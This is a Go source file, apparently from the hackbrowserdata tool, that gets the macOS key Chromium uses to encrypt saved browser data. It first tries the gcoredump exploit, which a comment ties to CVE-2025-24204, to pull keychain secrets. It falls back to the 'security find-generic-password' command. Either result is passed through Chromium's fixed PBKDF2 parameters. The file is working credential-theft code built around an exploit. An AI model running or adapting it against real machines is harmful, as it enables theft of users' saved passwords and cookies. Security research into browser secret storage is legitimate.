//go:build darwin

package keyretriever

import (
	"bytes"
	"crypto/sha1"
	"fmt"
	"os/exec"
	"strings"

	"github.com/moond4rk/hackbrowserdata/browser/exploit/gcoredump"
)

// https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_mac.mm;l=157
var darwinParams = pbkdf2Params{
	salt:       []byte("saltysalt"),
	iterations: 1003,
	keyLen:     16,
	hashFunc:   sha1.New,
}

// GcoredumpRetriever uses CVE-2025-24204 to extract keychain secrets.
// Requires root privileges on some systems.
type GcoredumpRetriever struct{}

func (r *GcoredumpRetriever) RetrieveKey(storage, _ string) ([]byte, error) {
	secret, err := gcoredump.DecryptKeychain(storage)
	if err != nil {
		return nil, fmt.Errorf("gcoredump: %w", err)
	}
	if secret == "" {
		return nil, fmt.Errorf("gcoredump: empty secret for %s", storage)
	}
	key := darwinParams.deriveKey([]byte(secret))
	if key == nil {
		return nil, fmt.Errorf("gcoredump: PBKDF2 derivation failed")
	}
	return key, nil
}

// SecurityCmdRetriever uses macOS `security` CLI to query Keychain.
type SecurityCmdRetriever struct{}

func (r *SecurityCmdRetriever) RetrieveKey(storage, _ string) ([]byte, error) {
	var stdout, stderr bytes.Buffer
	cmd := exec.Command("security", "find-generic-password", "-wa", strings.TrimSpace(storage)) //nolint:gosec
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		return nil, fmt.Errorf("security command: %w (%s)", err, strings.TrimSpace(stderr.String()))
	}
	if stderr.Len() > 0 {
		return nil, fmt.Errorf("keychain: %s", strings.TrimSpace(stderr.String()))
	}

	secret := bytes.TrimSpace(stdout.Bytes())
	if len(secret) == 0 {
		return nil, fmt.Errorf("keychain: empty secret for %s", storage)
	}

	key := darwinParams.deriveKey(secret)
	if key == nil {
		return nil, fmt.Errorf("PBKDF2 derivation failed")
	}
	return key, nil
}

// DefaultRetriever returns the macOS retriever chain:
// gcoredump (CVE-2025-24204) first, then security command fallback.
func DefaultRetriever() KeyRetriever {
	return NewChain(
		&GcoredumpRetriever{},
		&SecurityCmdRetriever{},
	)
}
